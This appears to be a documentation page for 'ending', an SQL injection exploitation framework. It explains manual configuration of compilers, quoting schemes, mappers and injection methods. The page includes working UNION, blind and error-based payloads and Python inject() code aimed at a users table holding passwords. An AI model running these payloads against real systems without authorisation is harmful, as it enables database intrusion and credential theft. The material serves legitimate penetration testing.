# Manual configuration

There are many reasons why you might need to configure the design manually. For instance:

- The injection might be too complex for *ending* to self-configure;
- A WAF might be present;
- You need a custom injection method or compiler.

If that's the case, do not worry: *ending* is **designed** to be configured by hand.

First, run the following command to get a better skeleton for your injection:

```bash
$ ending my-design configure --manual
```

!!! note

    `--manual` can be replaced by `-m`.

Your design class now contains a few additional methods: `inject()`, `set_compiler()`, `set_method()`, and `set_mapper()`, which you will need to set yourself. We'll tackle them one-by-one.


!!! note

    You can also use `--dbms` (`-d`) or `--method` if you know which DBMS and injection method you want to use.

## Figuring out the injection

To manually configure a design, you need to be able to perform a simple injection manually. For instance, you are able to perform an UNION, get an arbitrary error message, or a yes/no oracle from the database. In addition, you need to know the DBMS and a valid quoting method (i.e. a way to encode quoted strings).

If you managed to get all these, you can **setup the design** manually, one method at a time.

## Setting up the compiler

A compiler converts an AST into DBMS-specific SQL syntax. It is created by `set_compiler()`. By default, the method instanciates the `Compiler` of the `mysql` module; if you want to inject for PostgreSQL, for instance, import the `Compiler` from the `ending.db.postgres` module instead.

The only parameter for the compiler class is a callable that formats strings. The default, `quoting.singlequote`, simply surrounds them with `'`s. Pick the one that suits your injection better. For instance, `quoting.hexadecimal` converts them to their hexadecimal representation: `ABC` becomes `0x414243`.

!!! note

    Check the [`quoting` module](../pdoc/ending/util/quoting.html) to discover the available quoting functions.

Here's an example:

```python
from ending.util import quoting
from ending.db.mysql import *

...

class Design(HTTPDesign):
    ...

    async def set_compiler(self) -> Compiler:
        return Compiler(quote=quoting.singlequote_backslash)
```

## Setting up the mapper

The mapper is set using `set_mapper()`. It is used to get information about the structure of the database: database names, table names, column names, etc. In almost every case you just need to use the one provided by the DBMS you're using.

The `Mapper` class requires a `method` as its only argument. It can be set to `self.method`, which is configured later on. An example:

```python
from ending.db.mysql import *

...

class Design(HTTPDesign):
    ...
    
    async def set_mapper(self):
        return Mapper(self.method)
```

## Setting up the injection method

You've gone through the easy part. Now, you need to set up how the injection is performed. This can be done by setting the two last methods of your design: `set_method()` and `inject()`.

The injection method is set using `set_method()`. Each DBMS module has a few; the most standard are:

- `SelectMethod`: Used for UNION-based SQL injections.
- `ErrorBasedMethod`: Used for error-based SQL injections.
- `TestMethod`: Used for blind SQL injections.
- `TimebasedTestMethod`: Used for time-based SQL injections.

Most injection methods's constructors take only two arguments: a `compiler` and an `inject` method.

As an example, setting up an Blind SQL injection method would just look like this:

```python
async def set_method(self):
    return TestMethod(self.compiler, self.inject)
```

In addition to `set_method()`, we need to tell **ending** how to send its payloads, and obtain the response. This is done by the `inject()` method. It is used to send payloads produced by the injection method to the server, and get a response.

In the following sections, we will briefly cover how to create a `set_method()` and an `inject()` method for each **type of injection**: UNION, blind, error-based...

Let's imagine the base query looks like this:

```sql
SELECT id, username, password, email FROM users WHERE id = <injection>
```

!!! note

    The [Injection Methods](../library/method.md) page describes in greater details frequently used methods and how to use them. You can also check the documentation of each module (*e.g.* [mysql](../pdoc/ending/db/mysql/api.html)) to discover the available injection methods and their parameters.

### UNION-based SQL injection

Say that we want to perform an UNION-based SQL injection:

```SQL
-1 UNION SELECT NULL, 'displayed', NULL, NULL -- -
```

We have 4 columns in the original query, and (supposedly) the 2<sup>nd</sup> one is displayed on the page.

We use the `SelectMethod` class, which requires three additional arguments:

- `columns`: Number of columns in the SELECT statement. In our case, it's `4`.
- `column`: The index of the column that is displayed on the page. In our case, set it to `1` (it is zero-based).
- `nb_rows`: Number of rows displayed at once on the page. If every row is displayed, we can set a big number, such as `1000`.

We end up with this code:

```python
def set_method(self):
    return mysql.SelectMethod(
        self.compiler,
        self.inject,
        columns=4,
        column=1,
        nb_rows=1000,
    )
```

We can now code `inject(payload: Node) -> bytes`, which receives an SQL payload of the form `SELECT NULL, CONCAT(...), NULL, NULL` and returns the server's response as **bytes**. Therefore, the method needs to wrap it into a `UNION` statement followed by a comment. We can do this like so:

```python
    async def inject(self, payload: Node) -> bytes:
        payload = f"-1 UNION ALL {payload} -- -"
        return await self.send(payload)
```

### Blind (test-based) SQL injection

To perform a test-based SQL injection, we can use `TestMethod`, which only takes the two standard arguments, `compiler` and `inject`.

```python
async def set_method(self):
    return TestMethod(self.compiler, self.inject)
```

The method uses the `inject(condition: Node) -> bool` method to test if a condition is true or false. Since we're performing a test-based SQL injection, it needs to return a **boolean** indicating if the server returned *true* or *false*. We can do this like so:

```python
    async def inject(self, condition: Node) -> bool:
        payload = f"1 AND {condition}"
        response = await self.send(payload)
        return b"valid user" in response
```

!!!note
    
    If you're performing a time-based SQL injection, you can use `TimeBasedMethod` instead of `TestMethod`.

### Error-based SQL injection

There are several `ErrorBasedMethod`s for each DBMS. For this example, we'll focus on `ExtractValueMethod` from `mysql`. It takes the two standard arguments:

```python
async def set_method(self):
    return ExtractValueMethod(self.compiler, self.inject)
```

It produces SQL code that looks like this:

```sql
ExtractValue(':', CONCAT(':', (SELECT ...)))
```

It requires the `inject()` method to return the response as bytes (same as with `UNION`):

```python
    async def inject(self, payload: Node) -> bytes:
        payload = f"1 AND {payload}"
        return await self.send(payload)
```

## Configured design

If you have set the `inject()`, `set_compiler()`, `set_method()`, and `set_mapper()` methods of your `Design`, you are good to go!

The next step is to **validate the design**. Check the [Testing a design](design.md#testing-a-design-validate) section to see how it is done.